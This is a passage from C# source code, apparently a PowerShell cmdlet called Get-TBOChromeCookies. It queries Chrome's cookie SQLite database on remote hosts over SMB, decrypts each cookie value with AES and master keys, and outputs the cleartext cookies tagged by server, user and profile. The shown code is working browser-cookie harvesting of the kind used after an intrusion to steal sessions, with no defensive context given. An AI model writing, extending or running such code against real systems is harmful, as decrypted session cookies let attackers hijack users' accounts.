					bool? isSecure = null;
					if (!reader.IsDBNull(4))
					{
						try { isSecure = reader.GetInt32(4) != 0; } catch { }
					}

					bool? isHttpOnly = null;
					if (!reader.IsDBNull(5))
					{
						try { isHttpOnly = reader.GetInt32(5) != 0; } catch { }
					}

					byte[] encryptedValue = reader.IsDBNull(6) ? Array.Empty<byte>() : reader.GetFieldValue<byte[]>(6);

					ChromeCrypto.DecryptChromeValue(
						encryptedValue,
						aesStateKey,
						masterKeySet,
						logVerbose: msg => this.LogVerbose(smb, msg),
						out var cleartext,
						out var cleartextHex,
						out var cleartextBytes,
						out var encryptionType,
						out var masterKeyGuid,
						out var hmacValidated,
						out var failureReason);

					this.WriteObject(new TboChromeCookieInfo
					{
						ServerName = serverName,
						UserName = userName,
						ProfileName = profileName,
						SourcePath = sourcePath,
						HostKey = hostKey,
						Name = name,
						Path = path,
						ExpiresUtc = ChromeHelpers.TryConvertChromeTimestamp(expiresRaw),
						IsSecure = isSecure,
						IsHttpOnly = isHttpOnly,
						Value = cleartext,
						ValueHex = cleartextHex,
						ValueBytes = cleartextBytes,
						EncryptionType = encryptionType,
						MasterKeyGuid = masterKeyGuid,
						HmacValidated = hmacValidated,
						FailureReason = failureReason
					});
				}
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBOChromeCookies failed to query SQLite db '{sourcePath}'", ex);
			}
		}
	}
}
